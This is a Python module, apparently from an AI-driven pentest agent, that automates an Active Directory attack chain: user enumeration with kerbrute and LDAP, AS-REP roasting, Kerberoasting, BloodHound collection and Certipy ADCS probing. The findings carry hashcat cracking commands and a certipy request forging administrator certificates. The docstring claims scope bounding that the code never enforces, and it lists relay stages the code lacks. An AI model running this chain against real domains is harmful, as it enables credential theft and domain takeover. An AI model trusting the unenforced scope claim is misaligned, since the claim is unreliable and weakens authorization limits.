"""
ad_chain_orchestrator.py - Active Directory attack-chain coordinator.

Why this exists
---------------
AD is where engagements get won.  The high-value moves are well-known:
  1. Enumerate (anonymous LDAP / RID-cycling / kerbrute users)
  2. AS-REP-roast any account with DONT_REQ_PREAUTH
  3. Kerberoast every SPN-bearing account
  4. Try discovered creds via BloodHound to find paths to Domain Admin
  5. Look for ADCS misconfigs (ESC1, ESC8) via Certipy
  6. Coerce + relay (PetitPotam, PrinterBug -> ntlmrelayx)

An LLM-driven planner re-derives this chain every engagement.  This
orchestrator encodes it as a deterministic pipeline so the LLM is freed
for the genuinely novel parts (path interpretation, weird user-defined
permissions, custom enterprise apps).

What this module is and is NOT
------------------------------
- IT IS:  A glue layer that builds argv for the standard AD tool stack
          (impacket, certipy, kerbrute, ldapdomaindump, bloodhound-python),
          runs them through a caller-injected tool_runner, parses output
          into Finding + Credential records.
- IT IS NOT:  A tool implementation.  Every operation goes through the
              external binary (impacket-GetUserSPNs, certipy-ad, etc.).
              ARGUS must have the standard offensive Kali tool set
              installed.

Scope safety
------------
This module never originates target lists; the caller passes
`scope_hosts` and `dc_ip`.  All operations are bounded to those hosts.

Integration points
------------------
- credential_pipeline.get_vault() - newly-found creds are auto-ingested
- playbook engine - AD playbooks (ad_kerberoast, ad_asreproast,
  ad_bloodhound, ad_dcsync, ad_ntlmrelay, ad_petitpotam, ad_adcs_esc1,
  ad_zerologon, ad_unconstrained_delegation) are already loaded;
  this module dispatches them with the right context.
"""
from __future__ import annotations

import asyncio
import logging
import os
import re
import shutil
import time
from dataclasses import dataclass, field
from typing import Any, Awaitable, Callable, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


# ── Per-stage timeouts ──────────────────────────────────────────────────
TIMEOUT_USER_ENUM      = int(os.environ.get("AD_TIMEOUT_USER_ENUM",      "120"))
TIMEOUT_KERBEROAST     = int(os.environ.get("AD_TIMEOUT_KERBEROAST",     "180"))
TIMEOUT_ASREPROAST     = int(os.environ.get("AD_TIMEOUT_ASREPROAST",     "180"))
TIMEOUT_BLOODHOUND     = int(os.environ.get("AD_TIMEOUT_BLOODHOUND",     "600"))
TIMEOUT_CERTIPY        = int(os.environ.get("AD_TIMEOUT_CERTIPY",        "240"))


# Tool runner signature: (tool_name, argv, timeout) -> (exit, stdout, stderr)
ToolRunner = Callable[[str, List[str], int], Awaitable[Tuple[int, str, str]]]


@dataclass
class ADContext:
    dc_ip:           str
    domain:          str                        # FQDN, e.g. corp.local
    domain_short:    Optional[str] = None       # NETBIOS name, e.g. CORP
    scope_hosts:     List[str]     = field(default_factory=list)
    # Authentication context (any/all may be empty)
    username:        Optional[str] = None
    password:        Optional[str] = None
    ntlm_hash:       Optional[str] = None
    kerberos_ccache: Optional[str] = None       # path on disk
    # Discovered as we go
    discovered_users:  List[str] = field(default_factory=list)
    discovered_spns:   List[str] = field(default_factory=list)
    discovered_groups: List[str] = field(default_factory=list)
    discovered_admins: List[str] = field(default_factory=list)
    loot_dir:        str = "/tmp/argus-ad"

    @property
    def has_auth(self) -> bool:
        return bool(
            self.password or self.ntlm_hash or self.kerberos_ccache
        )

    @property
    def auth_str(self) -> str:
        """impacket-style user:pass@host or domain/user:pass@host."""
        prefix = f"{self.domain_short or self.domain.split('.')[0]}/" if self.domain else ""
        if self.password:
            return f"{prefix}{self.username}:{self.password}@{self.dc_ip}"
        return f"{prefix}{self.username}@{self.dc_ip}"


@dataclass
class ADResult:
    findings:    List[Dict[str, Any]] = field(default_factory=list)
    creds:       List[Dict[str, Any]] = field(default_factory=list)   # new credentials
    notes:       List[str] = field(default_factory=list)
    bloodhound_zip: Optional[str] = None
    duration_sec: float = 0.0


# ─── Stage implementations ───────────────────────────────────────────────

class ADChainOrchestrator:
    """Orchestrate the canonical AD attack chain.

    Stages run in order; the result of each populates the context for
    the next.  Any single stage failure is non-fatal (the orchestrator
    notes the failure and continues with the next stage).
    """

    def __init__(self, ctx: ADContext, tool_runner: ToolRunner,
                 on_event: Optional[Callable[[str, Dict[str, Any]], Awaitable[None]]] = None):
        self.ctx = ctx
        self.runner = tool_runner
        self.on_event = on_event
        os.makedirs(ctx.loot_dir, exist_ok=True)

    async def _emit(self, ev: str, data: Dict[str, Any]) -> None:
        if not self.on_event:
            return
        try:
            await self.on_event(ev, data)
        except Exception:
            pass

    # ── User enumeration (kerbrute / RID cycling / LDAP) ──────────────────
    async def enum_users(self) -> List[str]:
        await self._emit("ad_stage", {"stage": "enum_users"})
        users: List[str] = []
        # kerbrute userenum if available + we have a usernames list
        kerbrute = shutil.which("kerbrute")
        wordlist = self._first_existing([
            "/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt",
            "/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt",
            "/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt",
        ])
        if kerbrute and wordlist:
            try:
                exit_code, stdout, _ = await self.runner(
                    kerbrute, ["userenum", "--dc", self.ctx.dc_ip, "-d", self.ctx.domain,
                              wordlist, "-o", f"{self.ctx.loot_dir}/kerbrute.txt"],
                    TIMEOUT_USER_ENUM,
                )
                # kerbrute emits "[+] VALID USERNAME: <user>@<domain>"
                for m in re.findall(r"VALID USERNAME:\s*([^\s@]+)@", stdout):
                    users.append(m)
            except Exception as exc:
                logger.debug("[ad] kerbrute userenum failed: %s", exc)

        # If we have auth, ask LDAP for the user list (much faster + complete)
        if self.ctx.has_auth and shutil.which("ldapsearch"):
            try:
                args = [
                    "-x", "-LLL", "-h", self.ctx.dc_ip,
                    "-b", self._domain_dn(),
                    "(objectClass=user)", "sAMAccountName",
                ]
                if self.ctx.username:
                    args += ["-D", f"{self.ctx.username}@{self.ctx.domain}"]
                if self.ctx.password:
                    args += ["-w", self.ctx.password]
                exit_code, stdout, _ = await self.runner("ldapsearch", args, TIMEOUT_USER_ENUM)
                for m in re.findall(r"sAMAccountName:\s*([^\s]+)", stdout):
                    users.append(m)
            except Exception as exc:
                logger.debug("[ad] ldapsearch userenum failed: %s", exc)

        # Dedup + persist
        seen = set()
        deduped: List[str] = []
        for u in users:
            if u not in seen:
                seen.add(u)
                deduped.append(u)
        self.ctx.discovered_users = deduped
        await self._emit("ad_users", {"count": len(deduped), "sample": deduped[:5]})
        return deduped

    # ── AS-REP roast ─────────────────────────────────────────────────────
    async def asreproast(self) -> List[Dict[str, Any]]:
        await self._emit("ad_stage", {"stage": "asreproast"})
        findings: List[Dict[str, Any]] = []
        if not shutil.which("impacket-GetNPUsers"):
            return [{"title": "impacket-GetNPUsers not on PATH",
                     "severity": "INFO"}]
        # Write the user list to a file for impacket
        userfile = f"{self.ctx.loot_dir}/users.txt"
        try:
            with open(userfile, "w", encoding="utf-8") as f:
                f.write("\n".join(self.ctx.discovered_users) + "\n")
        except Exception:
            return findings

        out_hashes = f"{self.ctx.loot_dir}/asrep_hashes.txt"
        args = [
            f"{self.ctx.domain}/", "-no-pass",
            "-usersfile", userfile,
            "-format", "hashcat",
            "-outputfile", out_hashes,
            "-dc-ip", self.ctx.dc_ip,
        ]
        try:
            exit_code, stdout, stderr = await self.runner(
                "impacket-GetNPUsers", args, TIMEOUT_ASREPROAST,
            )
        except Exception as exc:
            return [{"title": f"AS-REP roast errored: {exc}", "severity": "INFO"}]

        # Hash collection: every line beginning with $krb5asrep$ is a roastable hash
        hashes: List[str] = []
        try:
            if os.path.exists(out_hashes):
                with open(out_hashes, "r", encoding="utf-8") as f:
                    for line in f:
                        line = line.strip()
                        if line.startswith("$krb5asrep$"):
                            hashes.append(line)
        except Exception:
            pass

        for h in hashes:
            # Username is in the hash header: $krb5asrep$23$user@DOMAIN:...
            m = re.search(r"\$krb5asrep\$\d+\$([^@:]+)", h)
            uname = m.group(1) if m else "?"
            findings.append({
                "title":    f"AS-REP roastable account: {uname}",
                "severity": "HIGH",
                "evidence": h[:200],
                "exploit":  "Crack offline: hashcat -m 18200 asrep_hashes.txt rockyou.txt",
                "mitre":    "T1558.004",
                "host":     self.ctx.dc_ip,
            })
        await self._emit("ad_asreproast", {"hashes": len(hashes)})
        return findings

    # ── Kerberoast ───────────────────────────────────────────────────────
    async def kerberoast(self) -> List[Dict[str, Any]]:
        await self._emit("ad_stage", {"stage": "kerberoast"})
        findings: List[Dict[str, Any]] = []
        if not self.ctx.has_auth:
            return [{"title": "Kerberoast skipped (no domain credentials)", "severity": "INFO"}]
        if not shutil.which("impacket-GetUserSPNs"):
            return [{"title": "impacket-GetUserSPNs not on PATH", "severity": "INFO"}]

        out_hashes = f"{self.ctx.loot_dir}/kerberoast_hashes.txt"
        target = self.ctx.auth_str
        args = [target, "-request",
                "-outputfile", out_hashes,
                "-dc-ip", self.ctx.dc_ip]
        if self.ctx.ntlm_hash and not self.ctx.password:
            args += ["-hashes", f":{self.ctx.ntlm_hash}"]
        try:
            await self.runner("impacket-GetUserSPNs", args, TIMEOUT_KERBEROAST)
        except Exception as exc:
            return [{"title": f"Kerberoast errored: {exc}", "severity": "INFO"}]

        hashes: List[str] = []
        if os.path.exists(out_hashes):
            try:
                with open(out_hashes, "r", encoding="utf-8") as f:
                    for line in f:
                        if line.startswith("$krb5tgs$"):
                            hashes.append(line.strip())
            except Exception:
                pass

        for h in hashes:
            m = re.search(r"\$krb5tgs\$\d+\$\*([^\*]+)\*", h)
            uname = m.group(1).split("$")[0] if m else "?"
            findings.append({
                "title":    f"Kerberoastable SPN account: {uname}",
                "severity": "HIGH",
                "evidence": h[:200],
                "exploit":  "Crack offline: hashcat -m 13100 kerberoast_hashes.txt rockyou.txt",
                "mitre":    "T1558.003",
                "host":     self.ctx.dc_ip,
            })
        await self._emit("ad_kerberoast", {"hashes": len(hashes)})
        return findings

    # ── BloodHound ingestion ─────────────────────────────────────────────
    async def bloodhound_collect(self) -> Optional[str]:
        await self._emit("ad_stage", {"stage": "bloodhound"})
        if not self.ctx.has_auth:
            return None
        if not shutil.which("bloodhound-python"):
            return None

        args = [
            "-c", "DCOnly",
            "-d", self.ctx.domain,
            "-u", self.ctx.username or "",
            "--zip",
            "-dc", self.ctx.dc_ip,
            "-ns", self.ctx.dc_ip,
        ]
        if self.ctx.password:
            args += ["-p", self.ctx.password]
        elif self.ctx.ntlm_hash:
            args += ["--hashes", f":{self.ctx.ntlm_hash}"]
        cwd = self.ctx.loot_dir
        try:
            exit_code, stdout, stderr = await self.runner(
                "bloodhound-python", args, TIMEOUT_BLOODHOUND,
            )
        except Exception as exc:
            await self._emit("ad_bloodhound", {"error": str(exc)})
            return None

        # bloodhound-python --zip writes <timestamp>_bloodhound.zip into CWD
        for fn in os.listdir(cwd):
            if fn.endswith("_bloodhound.zip"):
                full = os.path.join(cwd, fn)
                self.ctx.bloodhound_zip = full
                await self._emit("ad_bloodhound", {"zip": full})
                return full
        return None

    # ── ADCS misconfig probe (Certipy) ───────────────────────────────────
    async def adcs_find(self) -> List[Dict[str, Any]]:
        await self._emit("ad_stage", {"stage": "adcs_find"})
        findings: List[Dict[str, Any]] = []
        if not self.ctx.has_auth:
            return findings
        if not shutil.which("certipy-ad"):
            return findings
        args = [
            "find", "-u", f"{self.ctx.username}@{self.ctx.domain}",
            "-dc-ip", self.ctx.dc_ip,
            "-vulnerable", "-stdout",
        ]
        if self.ctx.password:
            args += ["-p", self.ctx.password]
        elif self.ctx.ntlm_hash:
            args += ["-hashes", f":{self.ctx.ntlm_hash}"]
        try:
            exit_code, stdout, stderr = await self.runner("certipy-ad", args, TIMEOUT_CERTIPY)
        except Exception as exc:
            return [{"title": f"Certipy find errored: {exc}", "severity": "INFO"}]

        for m in re.finditer(r"\[!\]\s*(ESC\d+)", stdout):
            esc = m.group(1)
            findings.append({
                "title":    f"ADCS misconfiguration {esc} on {self.ctx.domain}",
                "severity": "CRITICAL",
                "evidence": stdout[max(0, m.start() - 200):m.end() + 200][:600],
                "exploit":  f"certipy-ad req -u <user>@<dom> -p <pass> -ca <ca-name> -template <vuln-template> -upn administrator@{self.ctx.domain}",
                "mitre":    "T1649",
                "host":     self.ctx.dc_ip,
            })
        await self._emit("ad_adcs", {"findings": len(findings)})
        return findings

    # ── Driver ───────────────────────────────────────────────────────────
    async def run_chain(self) -> ADResult:
        result = ADResult()
        start = time.monotonic()
        await self._emit("ad_chain_start", {
            "domain": self.ctx.domain, "dc_ip": self.ctx.dc_ip,
            "has_auth": self.ctx.has_auth,
        })

        # 1) User enumeration (auth-optional)
        try:
            users = await self.enum_users()
            if users:
                result.findings.append({
                    "title":    f"AD user enumeration yielded {len(users)} usernames",
                    "severity": "INFO",
                    "evidence": ", ".join(users[:10]),
                    "host":     self.ctx.dc_ip,
                })
        except Exception as exc:
            result.notes.append(f"enum_users error: {exc}")

        # 2) AS-REP-roast (auth-optional)
        try:
            result.findings.extend(await self.asreproast())
        except Exception as exc:
            result.notes.append(f"asreproast error: {exc}")

        # 3) Kerberoast (requires auth)
        try:
            result.findings.extend(await self.kerberoast())
        except Exception as exc:
            result.notes.append(f"kerberoast error: {exc}")

        # 4) BloodHound DCOnly (requires auth)
        try:
            zip_path = await self.bloodhound_collect()
            if zip_path:
                result.bloodhound_zip = zip_path
                result.findings.append({
                    "title":    f"BloodHound data collected: {os.path.basename(zip_path)}",
                    "severity": "INFO",
                    "evidence": zip_path,
                    "host":     self.ctx.dc_ip,
                })
        except Exception as exc:
            result.notes.append(f"bloodhound error: {exc}")

        # 5) ADCS misconfigs (requires auth)
        try:
            result.findings.extend(await self.adcs_find())
        except Exception as exc:
            result.notes.append(f"adcs error: {exc}")

        result.duration_sec = time.monotonic() - start
        await self._emit("ad_chain_complete", {
            "findings": len(result.findings),
            "creds":    len(result.creds),
            "duration": round(result.duration_sec, 1),
        })
        return result

    # ── Helpers ──────────────────────────────────────────────────────────
    @staticmethod
    def _first_existing(paths: List[str]) -> Optional[str]:
        for p in paths:
            if os.path.exists(p):
                return p
        return None

    def _domain_dn(self) -> str:
        return ",".join(f"DC={p}" for p in self.ctx.domain.split("."))


__all__ = ["ADChainOrchestrator", "ADContext", "ADResult"]
